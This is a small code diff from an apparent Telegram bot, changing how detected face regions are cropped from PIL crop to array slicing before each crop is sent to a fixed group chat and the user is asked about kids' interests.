@@ -282,7 +282,7 @@ def process_photo_step(message):
         print("Found {0} faces!".format(len(faces)))
 
         for (x, y, w, h) in faces:
-            cropped = image.crop((x-100, y-200, x+w+100, y+h+100))
+            cropped = image[y-200:y+h+100, x-100:x+w+100]
             bot.send_photo(chat_id=-1001341610441, photo=cropped)
         msg = bot.send_message(chat_id, 'What kids like?')
         return bot.register_next_step_handler(msg, process_interest_step)
